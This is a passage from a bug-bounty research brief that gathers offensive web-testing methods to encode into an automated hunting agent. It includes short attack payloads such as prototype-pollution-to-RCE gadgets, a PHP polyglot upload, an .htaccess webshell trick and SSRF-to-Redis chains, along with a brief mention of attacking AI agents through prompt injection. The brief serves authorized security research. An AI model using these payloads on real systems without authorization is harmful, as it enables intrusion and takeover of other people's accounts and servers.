2. Oracle detection: server-side `{"__proto__":{"spaces":2}}` (JSON indentation change), `{"__proto__":{"status":555}}`; client-side DevTools console. Tools: PPScan, Burp DOM Invader.
3. Sink identification: `_.merge`, `_.defaultsDeep`, `qs.parse`, `obj[a][b]=c` patterns, superjson metadata, mongoose query objects.
4. Client exploitation: audit bundle for gadgets — undefined defaults flowing to `eval`, `transport_url` → script src, `innerHTML`. PortSwigger pattern: `?__proto__[transport_url]=data:,alert(1);`. Chain with DOM clobbering.
5. Server RCE: pollute `Object.prototype.env.NODE_OPTIONS = "--require /proc/self/environ"` + JS in `env`/`argv0` → any downstream `child_process.spawn` executes (normalizeSpawnArguments iterates prototype env keys).
6. Severity discipline: oracle-only = P3/P4; oracle + gadget → RCE = P1; authz tamper = P2.

**Famous examples:** SonarSource Blitz.js CVE-2022-23631 → unauthenticated RCE; Dat Phung mongoose CVE-2024-53900 → CVE-2025-23061 bypass (CVSS 9.0); 2026 Figma desktop PP → cross-platform RCE.

**Chaining:** PP + client gadget → DOM XSS (bypasses DOMPurify); PP + child_process → server RCE; PP + authz defaults → priv-esc; PP → sanitizer gadget (CVE-2026-41238).

**Rating:** HYBRID — oracle detection automatable; gadget discovery and RCE chains are human-built.

### 4.5 Insecure Deserialization + File Upload Bypasses

**Description.** Two payload-delivery routes to RCE: untrusted serialized objects walking gadget chains (Java `readObject`, PHP
`unserialize`, Python pickle, .NET BinaryFormatter, unsafe YAML); and upload filters defeated via extension/MIME/magic-byte/content differentials.

**How elites find it:**
- Deserialization: hunt sinks (base64 blobs — `rO0AB` = Java, `O:`/`a:` = PHP; `__VIEWSTATE` without generator; binary Content-Types). Safe detection: ysoserial `URLDNS` → Collaborator. Java: classpath fingerprint → gadget chain (CommonsCollections, fastjson `@type` — **CVE-2026-16723**, unauthenticated RCE, actively exploited). PHP: `b:0`→`b:1` flips, POP chains, `phar://`. Python: pickle `__reduce__`, `yaml.load` vs `safe_load`. Node: `node-serialize` IIFE.
- Upload: map the filter chain — test extension, Content-Type, magic bytes, size, content scan, filename in isolation. Extension ladder (`.phtml` `.phar` `.asa` `.cer`, case tricks, trailing dot/space, null byte). Double extensions. Magic-byte polyglots (`GIF89a<?php …?>` — Jul 2026 writeup beat six-layer filter → **$12,000**). Config injection: `.htaccess` `AddType application/x-httpd-php .png` + `shell.png` (Sep 2026 ByteVault). SVG stored XSS. Zip Slip (`../` entries). Parser bugs (ImageMagick/ExifTool). Post-upload: find file, check served Content-Type, test CDN subdomain independently.

**Famous examples:** fastjson CVE-2026-16723 (actively exploited, CVSS 9); mongoose CVEs 2024–2025 (CVSS 9.0); polyglot GIF+PHP → $12,000 (Jul 2026); ByteVault `.htaccess` chain (Sep 2026).

**Chaining:** webshell → RCE → metadata theft; SVG XSS → ATO; upload + LFI → code execution; deserialization RCE → internal pivot.

**Rating:** HYBRID — bypass ladder fully scriptable as a matrix; gadget-chain construction and differential analysis need humans.

---

## PART 5 — VULNERABILITY CHAINING METHODOLOGY

### The elite mental model

Elites don't collect vulnerabilities; they **prove attack scenarios**. The process:
1. **Crown-jewel thinking:** "if I could do ONE thing to this app, what causes the most damage?"
2. **Developer empathy:** "what was the simplest implementation a tired dev would write — where did they check auth, and where did they *assume* it was checked?"
3. **Trust-boundary mapping:** trace Client → CDN → LB → app → DB; ask where the app *stops* trusting input vs *assumes* validation happened upstream.
4. Hunt the **feature, not the endpoint** — vulnerabilities live in the gap between what the developer assumed and what the framework actually does.
5. Land a low finding (bug A) → inventory it as a **primitive** → systematically ask "what does A enable?" → hunt complementary bug B (time-boxed) → prove end-to-end.
6. Report chains as ONE narrative — programs pay for **impact, not technique count**. Low+Low proving ATO pays 3–10× isolated Mediums.

### Famous chains (proven, with payouts)

| Chain | Steps | Impact | Bounty |
|---|---|---|---|
| Open redirect → OAuth token theft → ATO (Booking.com, Salt Labs) | Open redirect on whitelisted OAuth host → crafted `redirect_uri` → tokens leak to attacker | ATO, ~500M MAU exposure | coordinated |
| Password-reset param injection → dual email → ATO (GitLab CVE-2023-7028) | JSON array `["victim","attacker"]` in reset email field → token sent to both | ATO, any account, zero interaction (CVSS 10.0) | **$35,000** |
| CL.TE smuggling → request hijacking → mass cookie theft (Slack) | Smuggle arbitrary requests → force victims' requests to attacker URL → harvest session cookies | Mass ATO | $6,500 |
| SSRF (screenshotter) → GCP metadata → container root (Shopify Exchange) | `password.liquid` template → metadata host → instance creds | Root on all instances | **$25,000** |
| Blind SSRF → gopher → Redis → cron → RCE (Yahoo Mail) | Redirect-follow SSRF → gopher:// → internal Redis → cron payload | RCE | $15,000 |
| SSRF → AWS metadata → IAM (HackerOne itself, H1 #2262382) | iframe to IMDS in analytics-report PDF | Cloud compromise (CVSS 10.0) | **$25,000** |
| Self-XSS → CSRF → stored XSS → ATO | No CSRF token on settings → forged request plants XSS → fires for admins | ATO | $1,500+ |
| IDOR email-change → password reset → silent ATO | `PUT /users/{victim}/email` → reset to attacker email | Silent ATO | $500–$2,048+ |
| CORS reflection + credentials → CSRF token theft → ATO | Credentialed cross-origin reads → steal CSRF token → forge sensitive action | ATO | up to $20,000 |
| JWT `alg:none` → admin → SSTI → RCE (Intigriti challenge, Nov 2025) | Full chain across three classes | RCE | challenge |

### Primitive inventory (lows elites deliberately collect)

Open redirect · Host-header reflection · CORS origin reflection (+creds) · postMessage handlers without origin check ·
self-XSS · unkeyed cache inputs · verbose errors/debug params · username enumeration · reset tokens in URL ·
IDOR reads · blind SSRF (DNS callback) · dangling CNAMEs (subdomain takeover) · cookie tossing · JWT alg confusion ·
exposed S3 listings.

Each has a known "next step": open redirect → test as OAuth `redirect_uri`; blind SSRF → metadata ladder; self-XSS → check CSRF gaps; IDOR read → try write on same path; subdomain takeover → check CSP/CORS/OAuth allowlists.

### Escalation playbook (the decision tree)

1. Confirm the primitive independently (exact request + response). Never report "A could chain with B" — prove it.
2. Classify A; look up the chain-signal table (A→B pairs).
3. Map what A *enables* (which trust boundary does it straddle?).
4. Time-box the B hunt: 20 min per candidate; 3 failures → cluster is dry, move on.
5. Gate each link: B must differ from A; each hop proven with its own evidence.
6. Iterate: does A+B unlock C? (SSRF → metadata → IAM → Lambda/EC2 RCE.)
7. Target auth-state transitions for ATO chains (reset, email change, OAuth, session, JWT, MFA).
8. Prove terminal impact on a second test account.
9. Write ONE narrative report: numbered steps, PoC per hop, one impact statement. Chains pay 3–10×.

### Chaining: automatable vs human

**Agent-encodable (~70%):** primitive inventory at scale (subdomain enum, header-reflection fuzzing, CORS checks, cache oracles,
dangling CNAMEs); signal-table lookup (A confirmed → auto-enumerate B candidates, time-boxed probes); OOB confirmation
(interactsh); auth-state transition mapping; PoC generation (CSRF pages, CORS exfil scripts, cache-poison requests);
re-testing loops. **Encode as deterministic orchestration: signal table + time-boxed A→B→C loop + gate rules.**

**Human:** crown-jewel prioritization; developer-empathy abduction (GitLab JSON-array injection, Slack smuggling — noticing framework
behaved differently than assumed); deciding a chain is dead vs needs a fresh angle; impact narrative; discovering the signal
table's *missing rows* (elite money). **Reserve free-form reasoning for these; make the engine learn — every proven chain appends a signal-table row.**

---

## PART 6 — NOVEL TECHNIQUES 2024–2026

- **"HTTP/1.1 Must Die" (Kettle, 2025):** parser-discrepancy framework (V-H/H-V) — probe any header one side processes while the
  other hides it; new variants 0.CL, CL.0, double-desync, Expect-based desyncs. Weaponized vs Akamai (CVE-2025-32094), Cloudflare
  Pingora (CVE-2025-4366), Netlify, IIS-behind-ALB. **$350K+** bounties in the 2025 campaign.
- **HTTP Request Smuggler v3.0** automates parser-discrepancy + CL.0 + H2-downgrade probes.
- **"HTTP Terminator" (PortSwigger, 2026):** AI pipeline (seeker→flamer→validator→investigator) tested ~30,000 authorized targets,
  found ~700 vulnerable — including an Apache Traffic Server zero-day.
- **HTTP/2 CONTINUATION flood (2024):** unbounded CONTINUATION frames → OOM/CPU DoS, invisible in access logs (CVEs across
  httpd, Tomcat, Envoy, Go, Node).
- **mXSS keeps chaining:** DOMPurify CVE-2024-47875 (CVSS 10.0, namespace confusion), CVE-2024-45801, CVE-2025-26791;
  namespace confusion (HTML vs SVG/MathML `<style>` raw-text semantics) is the top XSS vector class 2025–2026.
- **PP → sanitizer gadget (CVE-2026-41238):** prototype pollution now bypasses DOMPurify default config.
- **WAF-bypass primitives:** chunk-extension abuse, `Expect`-obfuscation, SQLi JSON-operator wrappers, MySQL versioned comments,
  Unicode lookalikes; sqlmap tamper chains layered by WAF tier.
- **SSRF hot again:** Oracle EBS SSRF→CRLF→XSLT RCE (CVE-2025-61882, CVSS 9.8, exploited); Next.js WebSocket SSRF (CVE-2026-44578);
  HTTP/2 `:authority` bypassing H1-based WAFs; AI-agent SSRF via prompt injection.
- **Client-side desync** (victim's browser sends the poison) — rising premium variant 2026.
- **Browser 0-days:** CVE-2025-2783 (Chrome sandbox escape), CVE-2025-5847 (V8 UAF) — relevant to rich client-side targets
  (document preview, headless PDF/screenshot sinks).

**Agent note:** desync detection, WAF fuzzing, mXSS spraying, SSRF egress confirmation automatable; inventing parser differentials
and namespace-confusion payloads are human. **Caution (2026):** Google paused OSS bounties over AI-generated report spam floods —
agents must self-request-verify every finding before submission.

---

## PART 7 — SOURCE CODE REVIEW FOR BUG BOUNTY

**When source leaks** (GitHub, exposed `.git`, JS bundles, APKs), elites run a pipeline:

1. **Quick-win leak loop (<30s):** `/.env*`, `/.git/HEAD`, `/swagger.json`, `/openapi.json`, `/api-docs` — curl loop, 200 = hit.
2. **Secret scanning:** `gitleaks` (low FP, scan history too) + `trufflehog` (verified detectors, always `--redact`). Scan git HISTORY — removed-from-tip secrets persist.
3. **JS bundle analysis (#1 free attack-surface multiplier):** harvest JS (`katana -jsl`, `subjs`, Wayback CDX) → source-map sweep
   (`<bundle>.js.map`, framework conventions, Next.js `/_buildManifest.js`) → webpack lazy-chunk enumeration (expect **70–90%**
   of SPA API surface in code-split chunks) → endpoint extraction with `jsluice` (AST-based, beats regex) → secret sweep
   (`SecretFinder`, `process.env.*`, `__NEXT_DATA__`).
4. **Dangerous sink greps:** string-built SQL, `exec`/`subprocess(shell=True)`, `pickle`/`yaml.load`/`unserialize`, SSRF sinks
   (`fetch(`, `axios.get(`, `requests.`), output sinks (`dangerouslySetInnerHTML`, `.innerHTML=`), postMessage handlers, JWT gaps.
5. **SAST:** `semgrep --config=p/security-audit` broad pass → per-sink custom patterns; CodeQL for real taint tracking.
6. **APK sweep:** `jadx` + `apktool` + `apkleaks` → exported components, Retrofit interfaces, staging URLs, Firebase keys;
   frida/objection for cert-pinning bypass; mitmproxy for runtime traffic.
7. **SCA:** `osv-scanner`, `trivy`, `retire.js` vs SRI attrs — supply chain is bounty-relevant (Shai-Hulud 2.0 npm worm, Nov 2025).
8. **Prove impact:** a key alone is Informational; a key that calls the API and burns budget is Medium/High. Source-map disclosure
   alone has paid **$25k+**.

**Rating:** AUTOMATABLE — the whole pipeline is scriptable; human needed to trace taint to a real exploit and judge impact.

---

## PART 8 — API SECURITY TESTING METHODOLOGY (REST)

The highest-yield methodology in current bounties (BOLA remains #1 critical API vuln; API attack traffic +201% 2023→2025):

1. **Discovery:** OpenAPI/Swagger scrape (10+ common paths) → JS extraction (`jsluice`) → APK endpoints → Postman collections →
   Wayback/`gau` → Kiterunner/ffuf wordlist sweep (Assetnote lists; Kiterunner substitutes placeholders contextually —
   `/todos/:todo_id/items/:id` missed by dumb fuzzing). Cross-reference vs specs to flag undocumented endpoints.
2. **Two-identity differential:** accounts A + B; capture B's legitimate access as ground truth; replay as A with B's object ID;
   identical body = confirmed. Burp **Autorize** automates the sweep.
3. **Per-endpoint method matrix:** probe every method; test `X-HTTP-Method-Override`; declared-vs-accepted mismatches are findings.
4. **Hidden params:** `arjun` on top-50 endpoints; response shape/length delta = hidden param (`debug=true`, `admin=1`).
5. **Two-identity differential on every reference:** path, query, body, header, cookie, WebSocket, nested (`/users/1/invoices/9`
   — parent checked, child not).
6. **Mass assignment per endpoint:** append `role/admin/isAdmin/verified/credits/tenant_id` to every write body; verify server-side effect.
7. **JWT matrix per endpoint:** strip, expire, `none`, alg-confusion, `kid` injection; v1/v2/v3 differentials with same tokens.
8. **Rate-limit pass:** 50–100 req bursts on auth/OTP/reset; bypass via XFF/UA/method/content-type.
9. **Excessive data exposure diff:** raw JSON vs UI-rendered fields; grep ORM JOIN leakage (2025 variant).
10. **Chain:** any two findings (BOLA + mass-assign, auth-bypass + BOLA, rate-bypass + OTP) → escalate to Critical before reporting.

**Rating:** AUTOMATABLE for discovery/matrices/replays/diffs; HUMAN for chaining and business-logic abuse.

---

## PART 9 — AGENT ENCODING GUIDE (what to build)

### Detection order per input point (cheap → expensive)
Template polyglot → XSS context probes → SQLi quote probes → XML/XXE probe → command separators. ~6 requests covers five classes.

### Tooling to bundle
`sqlmap` (+ tamper ladders), `dalfox`/`xsstrike`, `jwt_tool`, `hashcat -m 16500`, `commix`, `arjun`, `Kiterunner`/`ffuf` (+ Assetnote
wordlists), `jsluice`, `gitleaks`/`trufflehog`, `semgrep` (`p/security-audit`), `clairvoyance`/`graphql-cop`, Burp extensions:
Collaborator, Param Miner, HTTP Request Smuggler v3.0, Autorize, Turbo Intruder. OOB: interactsh.

### The chaining engine (deterministic core, ~70%)
Encode: **signal table** (A→B candidate pairs) + **time-boxed A→B→C loop** (20 min per B candidate, 3 failures → cluster dry) +
**gate rules** (confirm A independently; B differs from A; prove terminal impact on second test account; one narrative report).
Reserve free-form reasoning for: crown-jewel prioritization, anomaly-driven hypothesis generation, fresh-perspective retries.
**Make the engine learn:** every proven chain appends a signal-table row.

### Payout hierarchy observed (2024–2026 disclosed corpus)
RCE $20k–$33.5k > SSTI→RCE $5k–$30k > SQLi top $25k (Valve) > stored XSS up to $20k (PayPal) > blind XXE $500–$2k (escalates) >
reflected XSS ~$500. **Chains pay 3–10× singles.** Desync/H2 work: $5K–$30K+ with lowest dup rate.

### Safety constants (encode as hard rules)
- Random cache-buster on every cache test; stop instantly on cross-user responses.
- Check program rules before smuggling/cache-poisoning on prod (many forbid).
- Prove with `id`/`whoami` only; never persistent/destructive commands.
- Second-order payloads must not fire on real users; self-request verification mandatory.
- **2026 lesson:** AI-generated report spam got programs paused — every finding self-verified before submission, or the agent burns the program.

---

*Research compiled 7 Oct 2026 for the Dark Matter elite-hunter mission. Sources are community writeups, disclosed HackerOne reports,
and PortSwigger/Project Zero research — verify each technique live on authorized targets before encoding as ground truth.*
